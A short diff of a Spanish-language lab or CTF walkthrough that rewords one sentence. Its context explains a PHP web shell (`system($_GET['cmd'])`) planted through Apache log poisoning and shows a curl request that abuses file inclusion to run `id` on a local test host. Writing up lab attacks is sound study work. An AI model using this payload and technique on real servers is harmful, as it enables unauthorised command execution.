@@ -134,7 +134,7 @@ Aquí, el código PHP `<?php system(\$_GET['cmd']); ?>` hace lo siguiente:
 - `\$_GET['cmd']` toma el valor del parámetro `cmd` que se pasa en la URL.
 - Así, cuando se accede a la URL con `&cmd=algún_comando`, el servidor ejecuta ese comando y muestra la salida.
 
-Por eso, en la siguiente solicitud:
+Por eso, en la siguiente solicitud inyectaremos un comando:
 
 ```bash
 curl "http://172.17.0.2/test.php?page=/var/log/apache2/access.log&cmd=id"
